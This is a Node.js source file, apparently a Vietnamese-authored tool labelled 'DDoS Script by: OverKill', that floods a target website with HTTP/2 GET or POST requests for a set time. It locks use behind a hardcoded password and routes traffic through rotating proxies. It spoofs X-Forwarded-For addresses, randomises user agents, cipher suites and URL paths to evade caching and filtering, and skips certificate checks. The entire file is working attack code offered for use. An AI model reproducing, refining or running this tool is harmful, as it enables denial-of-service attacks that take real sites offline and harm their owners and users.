process.on("uncaughtException", function (er) {
  //console.log(er);
});
process.on("unhandledRejection", function (er) {
  //console.log(er);
});
require("events").EventEmitter.defaultMaxListeners = 0;
const fs = require("fs");
const url = require("url");
const randstr = require("randomstring");
const cluster = require("cluster");
const http2 = require("http2");

let headerbuilders;
let COOKIES = undefined;
let POSTDATA = undefined;

if (process.argv.length < 8) {
    console.log("\n\x1b[31m ERROR\x1b[37m: Nhập thiếu dữ liệu");
    console.log("\x1b[36m USAGE\x1b[37m: node HTTP-CRASH.js <GET/POST> <target> <time> <rate> <thread> <proxies>");
    console.log("\x1b[32m EXAMPLE\x1b[37m: node HTTP-CRASH.js https://example.com 60 100 proxy.txt");
    console.log("\x1b[93m DDoS Script by:\x1b[34m OverKill\x1b[0m\x1b[0m ");
    process.exit();
}

const passwordFlagIndex = process.argv.indexOf('-p');
const passwordFlagContent = process.argv[passwordFlagIndex + 1];

if (passwordFlagContent !== 'overkillzero') {
    console.log('\n\x1b[31mBản quyền thuộc về \x1b[1m\x1b[36mOverKillZero\x1b[0m');
    process.exit(1);
}
let randomparam = false;
var proxies = fs
  .readFileSync(process.argv[7], 'utf-8')
  .toString()
  .replace(/\r/g, "")
  .split("\n");
var UAs = fs.readFileSync("ua.txt", "utf-8").replace(/\r/g, "").split("\n");
var rate = process.argv[5];
var target_url = process.argv[3];
const target = target_url.split('""')[0];

process.argv.forEach((ss) => {
  if (ss.includes("cookie=") && !process.argv[2].split('""')[0].includes(ss)) {
    COOKIES = ss.slice(7);
  } else if (
    ss.includes("postdata=") &&
    !process.argv[2].split('""')[0].includes(ss)
  ) {
    if (process.argv[2].toUpperCase() != "POST") {
      console.error("");
      process.exit(1);
    }
    POSTDATA = ss.slice(9);
  } else if (ss.includes("randomstring=")) {
    randomparam = ss.slice(13);
    console.log("");
  } else if (ss.includes("headerdata=")) {
    headerbuilders = {
      "Cache-Control": "max-age=0",
      Referer: target,
      "X-Forwarded-For": spoof(),
      Cookie: COOKIES,
      ":method": "GET",
    };
    if (ss.slice(11).split('""')[0].includes("&")) {
      const hddata = ss.slice(11).split('""')[0].split("&");
      for (let i = 0; i < hddata.length; i++) {
        const head = hddata[i].split("=")[0];
        const dat = hddata[i].split("=")[1];
        headerbuilders[head] = dat;
      }
    } else {
      const hddata = ss.slice(11).split('""')[0];
      const head = hddata.split("=")[0];
      const dat = hddata.split("=")[1];
      headerbuilders[head] = dat;
    }
  }
});
if (COOKIES !== undefined) {
  console.log("");
} else {
  COOKIES = "";
}
if (POSTDATA !== undefined) {
  console.log("");
} else {
  POSTDATA = "";
}
if (headerbuilders !== undefined) {
  console.log("");
  const proxies_total = proxies.length - 2;
  const ua_total = UAs.length - 2;

  if (cluster.isMaster) {
    for (let i = 0; i < process.argv[6]; i++) {
      cluster.fork();
    }
    if (process.argv[9] == "n") {
      var result = "Random Number";
    } else {
      var result = "Random Character";
    }
    console.log(` Target:${process.argv[3]}`);
    console.log(` Method(POST/GET):${process.argv[2]}`);
    console.log(` Time:${process.argv[4]}s`);
    console.log(` Thread/Rate:${process.argv[6]}/${process.argv[5]}`);
    console.log(` Length Character:${process.argv[8]}`);
    console.log(` Mode:${result}`);
    console.log(` Proxy:${proxies_total + 2} `);
    console.log(` User-Agent:${ua_total + 2} `);

    setTimeout(() => {
      process.exit(1);
    }, process.argv[4] * 1000);
  } else {
    startflood();
  }
} else {
  headerbuilders = {
    "Cache-Control": "max-age=0",
    Referer: target,
    "X-Forwarded-For": spoof(),
    Cookie: COOKIES,
    ":method": "GET",
  };
  const proxies_total = proxies.length - 2;
  const ua_total = UAs.length - 2;

  if (cluster.isMaster) {
    for (let i = 0; i < process.argv[6]; i++) {
      cluster.fork();
    }
    if (process.argv[9] == "n") {
        var result = "Random Number";
      } else {
        var result = "Random Character";
      }
      console.log(` Target:${process.argv[3]}`);
      console.log(` Method(POST/GET):${process.argv[2]}`);
      console.log(` Time:${process.argv[4]}s`);
      console.log(` Thread/Rate:${process.argv[6]}/${process.argv[5]}`);
      console.log(` Length Character:${process.argv[8]}`);
      console.log(` Mode:${result}`);
      console.log(` Proxy:${proxies_total + 2} `);
      console.log(` User-Agent:${ua_total + 2} `);

    setTimeout(() => {
      process.exit(1);
    }, process.argv[4] * 1000);
  } else {
    startflood();
  }
}

var parsed = url.parse(target);
process.setMaxListeners(0);

if (process.argv[9] == "n") {
  function ra() {
    const rsdat = randstr.generate({
      charset: "01234567890123456789",
      length: process.argv[8],
    });
    return rsdat;
  }
} else {
  function ra() {
    const rsdat = randstr.generate({
      charset: "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890",
      length: process.argv[8],
    });
    return rsdat;
  }
}

/*onst UAs = [
    "Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
    "Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher"
];
*/

function spoof() {
  return `${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({
    length: 1,
    charset: "012345",
  })}${randstr.generate({ length: 1, charset: "012345" })}.${randstr.generate({
    length: 1,
    charset: "12",
  })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({
    length: 1,
    charset: "012345",
  })}.${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({
    length: 1,
    charset: "012345",
  })}${randstr.generate({ length: 1, charset: "012345" })}.${randstr.generate({
    length: 1,
    charset: "12",
  })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({
    length: 1,
    charset: "012345",
  })}`;
}

const cplist = [
  "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
];

function startflood() {
  if (process.argv[2].toUpperCase() == "POST") {
    const tagpage = url.parse(target).path.replace("[rand]", ra());
    headerbuilders[":method"] = "POST";
    headerbuilders["Content-Type"] = "text/plain";
    if (randomparam) {
      setInterval(() => {
        headerbuilders["User-agent"] =
          UAs[Math.floor(Math.random() * UAs.length)];

        var cipper = cplist[Math.floor(Math.random() * cplist.length)];

        var proxy = proxies[Math.floor(Math.random() * proxies.length)];

        proxy = proxy.split(":");

        var http = require("http"),
          tls = require("tls");

        tls.DEFAULT_MAX_VERSION = "TLSv1.3";

        var req = http.request(
          {
            //set proxy session
            host: proxy[0],
            port: proxy[1],
            ciphers: cipper,
            method: "CONNECT",
            path: parsed.host + ":443",
          },
          (err) => {
            req.end();
            return;
          }
        );

        req.on("connect", function (res, socket, head) {
          //open raw request
          const client = http2.connect(parsed.href, {
            createConnection: () =>
              tls.connect(
                {
                  host: parsed.host,
                  ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                  secureProtocol: "TLS_method",
                  servername: parsed.host,
                  secure: true,
                  rejectUnauthorized: false,
                  ALPNProtocols: ["h2"],
                  //sessionTimeout: 5000,
                  socket: socket,
                },
                function () {
                  for (let i = 0; i < rate; i++) {
                    headerbuilders[":path"] = `${url
                      .parse(target)
                      .path.replace(
                        "[rand]",
                        ra()
                      )}?${randomparam}=${randstr.generate({
                      length: 12,
                      charset:
                        "ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
                    })}`;
                    headerbuilders["X-Forwarded-For"] = spoof();
                    headerbuilders["Body"] = `${
                      POSTDATA.includes("[rand]")
                        ? POSTDATA.replace("[rand]", ra())
                        : POSTDATA
                    }`;
                    headerbuilders["Cookie"].replace("[rand]", ra());
                    const req = client.request(headerbuilders);
                    req.end();
                    req.on("response", () => {
                      req.close();
                    });
                  }
                }
              ),
          });
        });
        req.end();
      });
    } else {
      setInterval(() => {
        headerbuilders["User-agent"] =
          UAs[Math.floor(Math.random() * UAs.length)];

        var cipper = cplist[Math.floor(Math.random() * cplist.length)];

        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        proxy = proxy.split(":");

        var http = require("http"),
          tls = require("tls");

        tls.DEFAULT_MAX_VERSION = "TLSv1.3";

        var req = http.request(
          {
            //set proxy session
            host: proxy[0],
            port: proxy[1],
            ciphers: cipper,
            method: "CONNECT",
            path: parsed.host + ":443",
          },
          (err) => {
            req.end();
            return;
          }
        );

        req.on("connect", function (res, socket, head) {
          //open raw request
          const client = http2.connect(parsed.href, {
            createConnection: () =>
              tls.connect(
                {
                  host: `${
                    url.parse(target).path.includes("[rand]")
                      ? tagpage
                      : url.parse(target).path
                  }`,
                  ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                  secureProtocol: "TLS_method",
                  servername: parsed.host,
                  secure: true,
                  rejectUnauthorized: false,
                  ALPNProtocols: ["h2"],
                  //sessionTimeout: 5000,
                  socket: socket,
                },
                function () {
                  for (let i = 0; i < rate; i++) {
                    headerbuilders[":path"] = `${url
                      .parse(target)
                      .path.replace("[rand]", ra())}`;
                    headerbuilders["X-Forwarded-For"] = spoof();
                    headerbuilders["Body"] = `${
                      POSTDATA.includes("[rand]")
                        ? POSTDATA.replace("[rand]", ra())
                        : POSTDATA
                    }`;
                    headerbuilders["Cookie"].replace("[rand]", ra());
                    const req = client.request(headerbuilders);
                    req.end();
                    req.on("response", () => {
                      req.close();
                    });
                  }
                }
              ),
          });
        });
        req.end();
      });
    }
  } else if (process.argv[2].toUpperCase() == "GET") {
    headerbuilders[":method"] = "GET";
    if (randomparam) {
      setInterval(() => {
        headerbuilders["User-agent"] =
          UAs[Math.floor(Math.random() * UAs.length)];

        var cipper = cplist[Math.floor(Math.random() * cplist.length)];

        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        proxy = proxy.split(":");

        var http = require("http"),
          tls = require("tls");

        tls.DEFAULT_MAX_VERSION = "TLSv1.3";

        var req = http.request(
          {
            //set proxy session
            host: proxy[0],
            port: proxy[1],
            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
            method: "CONNECT",
            path: parsed.host + ":443",
          },
          (err) => {
            req.end();
            return;
          }
        );

        req.on("connect", function (res, socket, head) {
          //open raw request
          const client = http2.connect(parsed.href, {
            createConnection: () =>
              tls.connect(
                {
                  host: parsed.host,
                  ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                  secureProtocol: "TLS_method",
                  servername: parsed.host,
                  secure: true,
                  rejectUnauthorized: false,
                  ALPNProtocols: ["h2"],
                  //sessionTimeout: 5000,
                  socket: socket,
                },
                function () {
                  for (let i = 0; i < rate; i++) {
                    headerbuilders[":path"] = `${url
                      .parse(target)
                      .path.replace(
                        "[rand]",
                        ra()
                      )}?${randomparam}=${randstr.generate({
                      length: 12,
                      charset:
                        "ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
                    })}`;
                    headerbuilders["X-Forwarded-For"] = spoof();
                    headerbuilders["Cookie"].replace("[rand]", ra());
                    const req = client.request(headerbuilders);
                    req.end();
                    req.on("response", () => {
                      req.close();
                    });
                  }
                }
              ),
          });
        });
        req.end();
      });
    } else {
      setInterval(() => {
        headerbuilders["User-agent"] =
          UAs[Math.floor(Math.random() * UAs.length)];

        var cipper = cplist[Math.floor(Math.random() * cplist.length)];

        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        proxy = proxy.split(":");

        var http = require("http"),
          tls = require("tls");

        tls.DEFAULT_MAX_VERSION = "TLSv1.3";

        var req = http.request(
          {
            //set proxy session
            host: proxy[0],
            port: proxy[1],
            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
            method: "CONNECT",
            path: parsed.host + ":443",
          },
          (err) => {
            req.end();
            return;
          }
        );

        req.on("connect", function (res, socket, head) {
          //open raw request
          const client = http2.connect(parsed.href, {
            createConnection: () =>
              tls.connect(
                {
                  host: parsed.host,
                  ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                  secureProtocol: "TLS_method",
                  servername: parsed.host,
                  secure: true,
                  rejectUnauthorized: false,
                  ALPNProtocols: ["h2"],
                  //sessionTimeout: 5000,
                  socket: socket,
                },
                function () {
                  for (let i = 0; i < rate; i++) {
                    headerbuilders[":path"] = `${url
                      .parse(target)
                      .path.replace("[rand]", ra())}`;
                    headerbuilders["X-Forwarded-For"] = spoof();
                    headerbuilders["Cookie"].replace("[rand]", ra());
                    const req = client.request(headerbuilders);
                    req.end();
                    req.on("response", () => {
                      req.close();
                    });
                  }
                }
              ),
          });
        });
        req.end();
      });
    }
  } else {
    console.log("");
    process.exit(1);
  }
}
